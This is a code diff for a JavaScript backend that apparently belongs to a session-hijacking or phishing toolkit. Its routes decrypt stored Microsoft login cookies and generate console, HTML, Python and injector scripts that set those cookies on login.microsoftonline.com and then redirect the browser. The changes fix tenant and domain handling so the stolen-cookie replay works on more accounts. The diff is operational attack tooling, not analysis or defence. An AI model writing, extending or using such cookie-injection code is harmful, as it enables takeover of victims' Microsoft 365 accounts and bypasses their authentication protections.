@@ -140,9 +140,12 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
       return res.status(400).json({ error: 'No tokens available' });
     }
 
+    var tenant = token.tenant || config.AZURE_TENANT || 'common';
+    var accountType = token.account_type || 'unknown';
     var cookiesList = [];
     if (cookies) {
-      cookiesList = parseCookies(cookies);
+      // FIX: Pass tenant and account type for proper domain handling
+      cookiesList = parseCookies(cookies, { tenant: tenant, accountType: accountType });
     }
 
     if (cookiesList.length === 0) {
@@ -153,7 +156,7 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
     scripts.console = generatePopupScript(cookiesList);
     scripts.html = generateStandaloneHtml(cookiesList);
     scripts.python = generatePythonScript(cookiesList);
-    scripts.injector = generateInjectorScript(cookiesList, token.client_id || config.AZURE_CLIENT_ID, token.tenant || config.AZURE_TENANT || 'common');
+    scripts.injector = generateInjectorScript(cookiesList, token.client_id || config.AZURE_CLIENT_ID, tenant);
 
     res.json({
       script: scripts.console,
@@ -615,29 +618,33 @@ router.get('/inject-script', userAuth, async (req, res) => {
       return res.status(400).json({ error: 'No tokens available for injection' });
     }
 
+    // FIX: Pass tenant and account type for proper domain handling
+    var tenant = token.tenant || config.AZURE_TENANT || 'common';
+    var accountType = token.account_type || 'unknown';
+
     // Get cookies from token - require actual cookies only (no fallback)
     var cookiesList = [];
     var cookiesDecrypted = decrypt(token.cookies_encrypted);
     if (cookiesDecrypted) {
-      cookiesList = parseCookies(cookiesDecrypted);
+      cookiesList = parseCookies(cookiesDecrypted, { tenant: tenant, accountType: accountType });
     }
 
     if (cookiesList.length === 0) {
       return res.status(400).json({ error: 'No cookies available for injection' });
     }
 
-    // Build cookie injection statements in competitor's exact format
+    // Build cookie injection statements with proper domains
     var cookieStatements = '';
     for (var i = 0; i < cookiesList.length; i++) {
       var c = cookiesList[i];
-      cookieStatements += 'document.cookie = "' + c.name + '=' + c.value.replace(/"/g, '\\"') + '; domain=.login.microsoftonline.com; path=/; Secure; SameSite=None";\n';
+      cookieStatements += 'document.cookie = "' + c.name + '=' + c.value.replace(/"/g, '\\"') + '; domain=' + (c.domain || '.login.microsoftonline.com') + '; path=/; Secure; SameSite=None";\n';
     }
 
     const script = '(function() {\n' +
       cookieStatements + '\n' +
       '// Redirect after 3s\n' +
       'setTimeout(function() {\n' +
-      'window.location.href = "https://login.microsoftonline.com/?auth=2";\n' +
+      'window.location.href = "https://login.microsoftonline.com/' + tenant + '/?auth=2";\n' +
       '}, 3000);\n' +
       '})();';
 
